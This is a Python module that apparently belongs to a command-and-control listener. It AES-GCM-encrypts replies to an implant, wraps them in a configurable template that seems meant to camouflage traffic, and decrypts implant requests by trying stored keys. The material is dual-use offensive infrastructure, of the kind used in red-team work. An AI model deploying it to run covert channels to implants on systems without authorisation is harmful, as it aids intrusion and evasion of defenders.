import asyncio
import base64
import json
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from fastapi.responses import JSONResponse, Response
from infra.database.database import AesKeys
from infra.database.listener_utils import listener_utils
from .communication import wrap_template

aes_nonce_size = 12
aes_tag_size = 16
aes_probe_plain_len = 9
aes_probe_wire_len = aes_nonce_size + aes_probe_plain_len + aes_tag_size
aes_min_wire_len = aes_probe_wire_len + aes_nonce_size + aes_tag_size


def encrypt_bytes(key_b64: str, data: bytes) -> bytes:
    # Encrypts bytes with the AES key and a random nonce
    raw_key = base64.b64decode(key_b64)
    nonce = os.urandom(12)
    return nonce + AESGCM(raw_key).encrypt(nonce, data, None)


def build_encrypted_response(aes_key: str, content, config: dict | None) -> bytes:
    # Encrypts the JSON body and wraps it in the response template
    body = json.dumps(content, default=str).encode()
    encrypted = encrypt_bytes(aes_key, body)
    template = "§content§"
    if config:
        saved = str(config.get("listenerResponse") or "").strip()
        if saved:
            template = saved
    return wrap_template(template, encrypted)


async def respond(aes_key, content, status_code: int = 200, config: dict | None = None):
    # Returns JSON or an encrypted response for the implant
    if not aes_key:
        return JSONResponse(content=content, status_code=status_code)

    wrapped = await asyncio.to_thread(build_encrypted_response, aes_key, content, config)

    return Response(
        content=wrapped,
        media_type="application/octet-stream",
        status_code=status_code,
    )


def try_decrypt_blob(raw_key: bytes, blob: bytes) -> bytes | None:
    # Tries one AES key on a blob and returns the plain bytes
    if len(blob) < aes_nonce_size + aes_tag_size:
        return None
    try:
        return AESGCM(raw_key).decrypt(
            blob[:aes_nonce_size],
            blob[aes_nonce_size:],
            None,
        )
    except Exception:
        return None


def decrypt_body_sync(key_rows: list[str], body: bytes):
    # Tries every stored key until the body decrypts
    probe_blob = body[:aes_probe_wire_len]
    payload_blob = body[aes_probe_wire_len:]

    for key_b64 in key_rows:
        try:
            raw_key = base64.b64decode(key_b64)
        except Exception:
            continue
        probe_plain = try_decrypt_blob(raw_key, probe_blob)
        if probe_plain is None:
            continue
        plain = try_decrypt_blob(raw_key, payload_blob)
        if plain is not None:
            return plain, key_b64
    return None


async def decrypt_body(body: bytes):
    # Loads the AES keys and decrypts the request body
    if len(body) < aes_min_wire_len:
        return Response(status_code=200)

    rows = await listener_utils.read(AesKeys)
    key_rows = [row.key for row in rows]
    result = await asyncio.to_thread(decrypt_body_sync, key_rows, body)
    if result is None:
        return Response(status_code=200)
    return result
